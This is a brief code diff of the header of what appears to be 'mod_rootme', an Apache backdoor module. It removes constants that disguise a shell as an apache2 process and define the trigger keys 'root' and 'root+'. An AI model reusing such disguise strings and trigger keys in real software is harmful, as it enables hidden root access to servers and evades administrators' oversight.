@@ -2,10 +2,6 @@
 #ifndef __mod_rootme_h__
 #define __mod_rootme_h__
 
-#define HIDE_SHELL      "/usr/sbin/apache2 -k start"
-#define ROOT_KEY        "root"
-#define ROOT_KEY2       "root+"
-
 typedef struct sock_userdata_t sock_userdata_t;
 
 typedef struct apr_socket_t
